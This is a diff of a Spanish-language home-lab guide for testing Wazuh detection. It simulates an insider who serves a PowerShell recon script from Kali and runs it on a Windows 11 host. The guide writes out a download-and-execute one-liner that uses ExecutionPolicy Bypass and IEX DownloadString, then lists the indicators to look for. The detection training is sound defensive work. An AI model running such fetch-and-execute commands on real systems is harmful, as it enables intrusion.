@@ -11,10 +11,10 @@ Un atacante interno que intenta ejecutar comandos remotos contra un endpoint Win
 
 ### FASE 1 — Comprobaciones desde Kali
 #### localizamos nuestra ip en kali y comprobamos conexion a la red
->ip a
+>ip a  
 todo correcto , tenemos ip
 #### la ip de mi windows es 120, vamos a ver si lo "vemos" con un ping
->ping 192.168.1.120
+>ping 192.168.1.120  
 todo correcto, seguimos para bingo
 
 
@@ -28,27 +28,29 @@ En Kali
 
 editamos este archivo con el siguiente contenido ...
 
->Get-LocalUser
->Get-Process
->Get-Service
+>Get-LocalUser  
+>Get-Process  
+>Get-Service  
 
 Lo guardamos
 
 ### FASE 3 — Servir el script desde Kali, montamos un servidor muy sencillo con python
->python3 -m http.server 8080
+>python3 -m http.server 8080  
 dejamos esa terminal abierta , para que permanezca a la "escucha" :D 
 
 ### FASE 4 — Ejecución desde Windows 11 (aquí viene lo bueno)
 en w11, abrimos powershell y escribimos esto :
 
->powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.30:8080/recon.ps1')"
-192.168.1.30 es la ip de KALI , IMPORTANTE
+>powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.30:8080/recon.ps1')"  
+
+
+192.168.1.30 es la ip de KALI , IMPORTANTE  
 le estamos diciendo a w11 que descargue un codigo malicioso de esta malvada web :D 
 
 #### Esto es muy importante:
-ExecutionPolicy Bypass → red flag para wazuh !!
-Descarga remota
-Ejecución inmediata
+ExecutionPolicy Bypass → red flag para wazuh !!  
+Descarga remota  
+Ejecución inmediata  
 
 ### FASE 5 — Qué buscar en Wazuh (detección)
 En Wazuh → Explore → Discover
